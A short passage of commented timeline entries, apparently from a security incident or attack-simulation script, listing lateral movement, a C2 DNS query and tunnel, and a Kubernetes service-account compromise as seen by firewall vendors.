#      T+5  FwVendor2   SMB lateral movement WIN-PROD-01 → WIN-PROD-02
#      T+6  FwVendor1     DNS query for C2 FQDN — WildFire verdict: malware
#      T+7  FwVendor1     C2 HTTPS tunnel — allowed by broad rule (blind spot)
#      T+8  Kubernetes   Compromised svc account execs into kube-system pod
